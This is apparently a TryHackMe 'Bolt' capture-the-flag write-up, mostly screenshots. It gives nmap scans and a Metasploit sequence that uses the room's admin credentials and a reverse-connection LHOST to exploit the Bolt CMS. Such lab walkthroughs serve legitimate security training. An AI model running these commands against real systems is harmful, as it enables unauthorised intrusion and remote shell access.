# Bolt

**Room Link:** [https://tryhackme.com/room/bolt](https://tryhackme.com/room/bolt)



### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>





### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (13) (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (8) (15).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (8).png" alt=""><figcaption></figcaption></figure>

###

###

###

**Kali**

```
msfconsole
```

**Kali(msfconsole)**

```
search bolt
use 0
set RHOST $VICTIM
set LHOST $KALI
set USERNAME bolt
set PASSWORD boltadmin123
set TARGETURI http://$VICTIM:8000
run
```

<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>























































